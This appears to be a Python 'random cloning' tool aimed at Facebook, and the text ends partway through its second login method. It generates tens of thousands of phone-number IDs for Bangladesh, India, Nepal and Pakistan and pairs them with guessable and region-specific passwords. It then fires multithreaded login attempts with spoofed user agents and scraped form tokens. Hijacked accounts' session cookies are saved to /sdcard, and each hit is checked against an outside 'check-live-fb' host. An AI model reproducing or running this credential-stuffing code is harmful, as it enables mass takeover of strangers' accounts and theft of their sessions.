#---------------------------| Import |---------------------------#
import requests,bs4,json,uuid,os,sys,random,datetime,time,re,urllib3,base64,string,platform
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime
print('[=] Loading System ')
#---------------------------| Loop |---------------------------#
id,memek,loop,ok,cp=[],[],0,0,0
#---------------------------| User Agent |---------------------------#
def fuck():
    A = "Mozilla/5.0 (Linux; Android 9; CPH1937 Build/PKQ1."+str(random.randint(111111,999999))+".001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+str(random.randint(10,100))+".0."+str(random.randint(1111,9999))+"."+str(random.randint(99,222))+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+str(random.randint(222,333))+".0.0.46."+str(random.randint(111,135))+";]"
    B = "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/162.0.0.45.94;]"
    C = "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320H Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/166.0.0.66.95;]"
    D = "Mozilla/5.0 (Linux; Android 5.0.2; vivo Y51 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]"
    E = "Mozilla/5.0 (Linux; Android 7.0; HUAWEI CAN-L11 Build/HUAWEICAN-L11; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]"
    return random.choice([A,B,C,D,E,])
#---------------------------| Colour |---------------------------#
A = '\x1b[1;97m';G1 = '\033[1;32m'
white = '\x1b[1;97m';green = '\x1b[38;5;48m';ping = '\x1b[38;5;205m';Y = '\033[1;33m';rr = random.randint;rc = random.choice
#---------------------------| Linex |---------------------------#
def clear():os.system('clear');print(logo)
def cd():os.system('cd')
def linex():print(f'{Y}─────────────────────────────────────────────')
#---------------------------| Logo |---------------------------#

logo=(f'''{Y}─────────────────────────────────────────────
{green}█▀█ █▀▀ ░░█ ▄▀█ █░█ █░░   █▄▀ ▄▀█ █▀█ █ █▀▄▀█
█▀▄ ██▄ █▄█ █▀█ █▄█ █▄▄   █░█ █▀█ █▀▄ █ █░▀░█
{Y}─────────────────────────────────────────────{A}
[•]\033[1;37m AUTHOR       : {green} MD REJAUL KARIM{A}
[•]\033[1;37m TOOL STATUS  :{green}  FREE{A}
[•]\033[1;37m TOOL VERSION : {green} 1.3.3{A}
[•]\033[1;37m CLONING MTHD : {green} RANDOM CLONE
{Y}─────────────────────────────────────────────''')
#---------------------------| Menux |---------------------------#
def _____menux_____():
    clear()
    print(f"{white}[1] Random Cloning ");print(f"{white}[2] Old Ids Clone ");print("[0] Exit Tools ");linex();option=input(f"{white}[?] Choice ➤{green} ")
    if option in ["1"]:_____randmx_____()
    if option in ["2"]:_____oldx_____()
    if option in ["0"]:cd()
    else:exit()
#---------------------------| Random |---------------------------#
def _____randmx_____():
    clear()
    print(f"{white}[1] Random Bd {Y}[1{Y}]");print(f"{white}[2] Random Bd {Y}[2{Y}]");print(f"{white}[3] Random India ");print(f"{white}[4] Random Nepal ");print(f"{white}[5] Random Pakistan ");print(f"{white}[0] Menu ");linex();option=input(f"{white}[?] Choice ➤{green} ")
    if option in ["1"]:_____bd1x_____()
    if option in ["2"]:_____bd2x_____()
    if option in ["3"]:_____Indiax_____()
    if option in ["4"]:_____nepalx_____()
    if option in ["5"]:_____pakistanx_____()
    if option in ["0"]:_____menux_____()
    else:exit()
#---------------------------| Random Bd System 1 |---------------------------#
user=[]
def _____bd1x_____():
    clear()
    print(f"{white}[=] Example ➤{green} 01728 , 01987 , 01818 , 01610 ");linex()
    code=input(f"{white}[?] Choice ➤{green} ")
    clear();print(f"{white}[1] Method {green}M1 ");print(f"{white}[2] Method {green}M2 ");print(f"{white}[3] Method {green}M3 ");print(f"{white}[4] Method {green}M4 ");print(f"{white}[0] Return Country Method ");linex();methd=input(f"{white}[?] Choice ➤{green} ")
    limit = str(random.randint(30000,70000))
    for nmbr in range(int(limit)):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with tred(max_workers=30) as DONx:
        clear();tl = str(len(user))
        print(f"{white}[=] Your Choice Namber {green}{code} ");print(f"{white}[=] Uid {green}{tl} ");linex()
        for love in user:
            uid = code+love
            pwx = [uid,love,uid[:7],uid[:6],uid[:8]]
            if methd in ['1']:DONx.submit(____M1____,uid,pwx)
            if methd in ['2']:DONx.submit(____M2____,uid,pwx)
            if methd in ['3']:DONx.submit(____M3____,uid,pwx)
            if methd in ['4']:DONx.submit(____M4____,uid,pwx)
            if methd in ['0']:_____randmx_____()
    print("");linex();print(f"{white}[=] Cloning Complete Brother ");print(f'{white}[=] Total OK ➤ '+str(len(ok)));print(f'{white}[=] Total Cp ➤ '+str(len(cp)));linex();_____menux_____()
#---------------------------| Random Bd System 2 |---------------------------#
user=[]
def _____bd2x_____():
    clear()
    print(f"{white}[=] Example ➤{green} 017 , 019 , 018 , 016 ");linex()
    code=input(f"{white}[?] Choice ➤{green} ")
    clear();print(f"{white}[1] Method {green}M1 ");print(f"{white}[2] Method {green}M2 ");print(f"{white}[3] Method {green}M3 ");print(f"{white}[4] Method {green}M4 ");print(f"{white}[0] Return Country Method ");linex();methd=input(f"{white}[?] Choice ➤{green} ")
    limit = str(random.randint(30000,70000))
    for nmbr in range(int(limit)):
        coda = ''.join(random.choice(string.digits) for _ in range(2))
        codb = ''.join(random.choice(string.digits) for _ in range(2))
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with tred(max_workers=30) as DONx:
        clear();tl = str(len(user))
        print(f"{white}[=] Your Choice Namber {green}{code} ");print(f"{white}[=] Uid {green}{tl} ");linex()
        for love in user:
            uid = code+coda+codb+love
            pwx = [code+coda+codb+love,codb+love,coda+love,code+coda+codb,'Bangladesh','freefiree']
            if methd in ['1']:DONx.submit(____M1____,uid,pwx)
            if methd in ['2']:DONx.submit(____M2____,uid,pwx)
            if methd in ['3']:DONx.submit(____M3____,uid,pwx)
            if methd in ['4']:DONx.submit(____M4____,uid,pwx)
            if methd in ['0']:_____randmx_____()
    print("");linex();print(f"{white}[‌‌=] Cloning Complete Brother ");print(f'{white}[=] Total OK ➤ '+str(len(ok)));print(f'{white}[=] Total Cp ➤ '+str(len(cp)));linex();exit()
#---------------------------| Random India |---------------------------#
user=[]
def _____Indiax_____():
    clear()
    print(f"{white}[=] Example ➤{green} +91639 | +98171 | +91821 ");linex()
    code=input(f"{white}[?] Choice ➤{green} ")
    clear();print(f"{white}[1] Method {green}M1 ");print(f"{white}[2] Method {green}M2 ");print(f"{white}[3] Method {green}M3 ");print(f"{white}[4] Method {green}M4 ");print(f"{white}[0] Return Country Method ");linex();methd=input(f"{white}[?] Choice ➤{green} ")
    limit = str(random.randint(30000,70000))
    for nmbr in range(int(limit)):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as DONx:
        clear();tl = str(len(user))
        print(f"{white}[=] Your Choice Namber {green}{code} ");print(f"{white}[=] Uid {green}{tl} ");linex()
        for love in user:
            uid = code+love
            pwx = [love,uid[:8],'57273200','59039200']
            if methd in ['1']:DONx.submit(____M1____,uid,pwx)
            if methd in ['2']:DONx.submit(____M2____,uid,pwx)
            if methd in ['3']:DONx.submit(____M3____,uid,pwx)
            if methd in ['4']:DONx.submit(____M4____,uid,pwx)
            if methd in ['0']:_____randmx_____()
    print("");linex();print(f"{white}[=] Cloning Complete Brother ");print(f'{white}[=] Total OK ➤ '+str(len(ok)));print(f'{white}[=] Total Cp ➤ '+str(len(cp)));linex();exit()
#---------------------------| Random Nepal |---------------------------#
user=[]
def _____nepalx_____():
    clear()
    print(f"{white}[=] Example ➤{green} 9815 | 9814 | 9861 ");linex()
    code=input(f"{white}[?] Choice ➤{green} ")
    clear();print(f"{white}[1] Method {green}M1 ");print(f"{white}[2] Method {green}M2 ");print(f"{white}[3] Method {green}M3 ");print(f"{white}[4] Method {green}M4 ");print(f"{white}[0] Return Country Method ");linex();methd=input(f"{white}[?] Choice ➤{green} ")
    limit = str(random.randint(30000,70000))
    for nmbr in range(int(limit)):
        nmp = "". join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with tred(max_workers=30) as DONx:
        clear();tl = str(len(user))
        print(f"{white}[=] Your Choice Namber {green}{code} ");print(f"{white}[=] Uid {green}{tl} ");linex()
        for love in user:
            uid = code+love
            pwx = [uid,love,uid[:8],uid[:7],uid[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
            if methd in ['1']:DONx.submit(____M1____,uid,pwx)
            if methd in ['2']:DONx.submit(____M2____,uid,pwx)
            if methd in ['3']:DONx.submit(____M3____,uid,pwx)
            if methd in ['4']:DONx.submit(____M4____,uid,pwx)
            if methd in ['0']:_____randmx_____()
    print("");linex();print(f"{white}[=] Cloning Complete Brother ");print(f'{white}[=] Total OK ➤ '+str(len(ok)));print(f'{white}[=] Total Cp ➤ '+str(len(cp)));linex();exit()
#---------------------------| Random Pakistanx |---------------------------#
user=[]
def _____pakistanx_____():
    clear()
    print(f"{white}[=] Example ➤{green} 0306 | 0335 | 0315 ");linex()
    code=input(f"{white}[?] Choice ➤{green} ")
    clear();print(f"{white}[1] Method {green}M1 ");print(f"{white}[2] Method {green}M2 ");print(f"{white}[3] Method {green}M3 ");print(f"{white}[4] Method {green}M4 ");print(f"{white}[0] Return Country Method ");linex();methd=input(f"{white}[?] Choice ➤{green} ")
    limit = str(random.randint(30000,70000))
    for nmbr in range(int(limit)):
        nmp = "". join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with tred(max_workers=30) as DONx:
        clear();tl = str(len(user))
        print(f"{white}[=] Your Choice Namber {green}{code} ");print(f"{white}[=] Uid {green}{tl} ");linex()
        for love in user:
            uid = code+love
            pwx = [love,uid,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
            if methd in ['1']:DONx.submit(____M1____,uid,pwx)
            if methd in ['2']:DONx.submit(____M2____,uid,pwx)
            if methd in ['3']:DONx.submit(____M3____,uid,pwx)
            if methd in ['4']:DONx.submit(____M4____,uid,pwx)
            if methd in ['0']:_____randmx_____()
    print("");linex();print(f"{white}[=] Cloning Complete Brother ");print(f'{white}[=] Total OK ➤ '+str(len(ok)));print(f'{white}[=] Total Cp ➤ '+str(len(cp)));linex();exit()
    
#---------------------------| Old Idz |-------------------------------#
def _____oldx_____():
    clear()
    limit = str(random.randint(30000,70000))
    for nmbr in range(int(limit)):
        nmp = ''.join(rc(string.digits) for _ in range(10))
        user.append(nmp)
    with tred(max_workers=30) as DONx:
        clear();tl = str(len(user))
        print(f"{white}[=] Uid {green}{tl} ");linex()
        for love in user:
            uid=str("10000"+love);pas=['12345678','123456789']
            DONx.submit(____old____,uid,pas,tl)
    print("");linex();print(f"{white}[=] Cloning Complete Brother ");print(f'{white}[=] Total OK ➤ '+str(len(ok)));print(f'{white}[=] Total Cp ➤ '+str(len(cp)));linex();exit()
    
#---------------------------| Random Method 1 |---------------------------#    
def ____M1____(uid,pwx):
    global loop,ok,cp
    sys.stdout.write(f"\r\r{white}<[DON-M1]> {Y}[{white}{loop}{Y}] [{green}OK-{ok}{Y}] [{white}{cp}{Y}] ");sys.stdout.flush()
    ewe = requests.Session()
    ua = fuck()
    for pw in pwx:
        try:
            link = ewe.get("https://x.facebook.com/login.php?skip_api_login=1&api_key=1663534280540672&kid_directed_site=0&app_id=1663534280540672&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D1663534280540672%26auth_type%26cbt%3D1707300145639%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd779066dd5b40b99%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%26client_id%3D1663534280540672%26display%3Dtouch%26domain%3Dwww.joox.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joox.com%252Fid%252Flogin%26locale%3Den_US%26logger_id%3Dfeb763709d5e8b032%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcc815e62c9dea3d8%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%2526frame%253Df50e05a96e3646380%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcc815e62c9dea3d8%26domain%3Dwww.joox.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joox.com%252Ffe5c1e614950497cf%26relation%3Dopener%26frame%3Df50e05a96e3646380%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
            data = {
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(link)).group(1),
                "try_number": 0,
                "unrecognized_tries": 0,
                "email": uid,
                "prefill_contact_point": uid,
                "prefill_source": "browser_dropdown",
                "prefill_type": "contact_point",
                "first_prefill_source": "browser_dropdown",
                "first_prefill_type": "contact_point",
                "had_cp_prefilled": True,
                "had_password_prefilled": False,
                "is_smart_lock": False,
                "bi_xrwh": 0,
                "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
                "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                "jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1),
                "lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)
                }
            headers = {
                "Host": "x.facebook.com",
                "content-length": str(len((data))),
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),
                "sec-ch-ua-mobile": "?1",
                "user-agent": ua,
                "x-response-format": "JSONStream",
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
                "viewport-width": "360",
                "x-requested-with": "XMLHttpRequest",
                "x-asbd-id": "129477",
                "dpr": "2",
                "sec-ch-prefers-color-scheme": "light",
                "sec-ch-ua-platform": '"Android"',
                "accept": "*/*",
                "origin": "https://x.facebook.com",
                'referer': 'https://x.facebook.com/login.php?skip_api_login=1&api_key=1663534280540672&kid_directed_site=0&app_id=1663534280540672&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D1663534280540672%26auth_type%26cbt%3D1707300145639%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd779066dd5b40b99%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%26client_id%3D1663534280540672%26display%3Dtouch%26domain%3Dwww.joox.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joox.com%252Fid%252Flogin%26locale%3Den_US%26logger_id%3Dfeb763709d5e8b032%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcc815e62c9dea3d8%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%2526frame%253Df50e05a96e3646380%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcc815e62c9dea3d8%26domain%3Dwww.joox.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joox.com%252Ffe5c1e614950497cf%26relation%3Dopener%26frame%3Df50e05a96e3646380%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                }
            response = ewe.post("https://x.facebook.com/login/device-based/login/async/?api_key=1663534280540672&auth_token=b17ee38811884c2a4fea894114da656a&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D1663534280540672%26auth_type%26cbt%3D1707300145639%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd779066dd5b40b99%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%26client_id%3D1663534280540672%26display%3Dtouch%26domain%3Dwww.joox.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joox.com%252Fid%252Flogin%26locale%3Den_US%26logger_id%3Dfeb763709d5e8b032%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcc815e62c9dea3d8%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%2526frame%253Df50e05a96e3646380%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=1663534280540672&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcc815e62c9dea3d8%26domain%3Dwww.joox.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joox.com%252Ffe5c1e614950497cf%26relation%3Dopener%26frame%3Df50e05a96e3646380%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100",
                data = data,
                headers = headers,
                allow_redirects = False
                )
            if "checkpoint" in ewe.cookies.get_dict():
                ids = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                print(f"\r\r{ping}<[DON-CP]> {ids} ● {pw} ")
                cp+=1
                open('/sdcard/DON-RANDN-M1-CP.txt','a').write(ids+'|'+pw+'\n')
                break
            elif "c_user" in ewe.cookies.get_dict():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                lk_remove =f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={ids}"
                lkbal = requests.get(lk_remove).text
                if 'LIVE' in lkbal:
                    print(f"\r\r\x1b[38;5;48m<[DON-OK]> {ids} ● {pw} ")
                    print(f"\r\r\x1b[38;5;48m<[DON-OK]>{white} {kuki}")
                    ok+=1
                    open('/sdcard/DON-RANDM-M1-OK.txt', 'a').write(ids+' | '+pw+' |-> '+kuki+"\n")
                    break
                else:break
        except requests.exceptions.ConnectionError:time.sleep(15)
    loop +=1
#---------------------------| Random Method 2 |---------------------------#    
def ____M2____(uid,pwx):
    global loop,ok,cp
    sys.stdout.write(f"\r\r{white}<[DON-M2]> {Y}[{white}{loop}{Y}] [{green}OK-{ok}{Y}] [{white}{cp}{Y}] ");sys.stdout.flush()
    ewe = requests.Session()
    ua = fuck()
    for pw in pwx:
        try:
            link = ewe.get("https://p.facebook.com/login.php?skip_api_login=1&api_key=1663534280540672&kid_directed_site=0&app_id=1663534280540672&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D1663534280540672%26auth_type%26cbt%3D1707300145639%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd779066dd5b40b99%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%26client_id%3D1663534280540672%26display%3Dtouch%26domain%3Dwww.joox.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joox.com%252Fid%252Flogin%26locale%3Den_US%26logger_id%3Dfeb763709d5e8b032%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcc815e62c9dea3d8%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%2526frame%253Df50e05a96e3646380%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcc815e62c9dea3d8%26domain%3Dwww.joox.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joox.com%252Ffe5c1e614950497cf%26relation%3Dopener%26frame%3Df50e05a96e3646380%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
            data = {
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(link)).group(1),
                "try_number": 0,
                "unrecognized_tries": 0,
                "email": uid,
                "prefill_contact_point": uid,
                "prefill_source": "browser_dropdown",
                "prefill_type": "contact_point",
                "first_prefill_source": "browser_dropdown",
                "first_prefill_type": "contact_point",
                "had_cp_prefilled": True,
                "had_password_prefilled": False,
                "is_smart_lock": False,
                "bi_xrwh": 0,
                "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
                "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                "jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1),
                "lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)
                }
            headers = {
                "Host": "p.facebook.com",
                "content-length": str(len((data))),
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),
                "sec-ch-ua-mobile": "?1",
                "user-agent": ua,
                "x-response-format": "JSONStream",
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
                "viewport-width": "360",
                "x-requested-with": "XMLHttpRequest",
                "x-asbd-id": "129477",
                "dpr": "2",
                "sec-ch-prefers-color-scheme": "light",
                "sec-ch-ua-platform": '"Android"',
                "accept": "*/*",
                "origin": "https://p.facebook.com",
                'referer': 'https://p.facebook.com/login.php?skip_api_login=1&api_key=1663534280540672&kid_directed_site=0&app_id=1663534280540672&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D1663534280540672%26auth_type%26cbt%3D1707300145639%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd779066dd5b40b99%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%26client_id%3D1663534280540672%26display%3Dtouch%26domain%3Dwww.joox.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joox.com%252Fid%252Flogin%26locale%3Den_US%26logger_id%3Dfeb763709d5e8b032%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcc815e62c9dea3d8%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%2526frame%253Df50e05a96e3646380%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcc815e62c9dea3d8%26domain%3Dwww.joox.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.joox.com%252Ffe5c1e614950497cf%26relation%3Dopener%26frame%3Df50e05a96e3646380%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                }
